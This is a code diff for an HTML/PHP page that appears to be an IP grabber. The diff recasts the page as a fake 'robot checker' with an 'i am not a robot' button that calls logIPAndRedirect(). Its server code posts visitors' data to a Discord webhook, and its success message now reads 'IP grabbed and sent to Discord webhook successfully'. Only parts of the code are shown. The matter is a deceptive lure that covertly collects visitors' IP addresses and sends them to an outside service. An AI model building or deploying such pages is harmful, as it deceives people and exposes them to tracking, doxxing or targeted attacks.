@@ -3,12 +3,12 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ngl</title>
+  <title>robot checker</title>
 </head>
 <body>
   <h1></h1>
-  <p>Please click below if the page has not loaded</p>
-  <button onclick="logIPAndRedirect()">Redirect here</button>
+  <p>Please click below if you are not a robot</p>
+  <button onclick="logIPAndRedirect()">i am not a robot</button>
 
   <script>
     function logIPAndRedirect() {
@@ -81,7 +81,7 @@
     $result = file_get_contents($discordWebhook, false, $context);
 
     // Respond with a success message
-    echo 'IP sent to Discord webhook successfully';
+    echo 'IP grabbed and sent to Discord webhook successfully';
   }
   ?>
 </body>
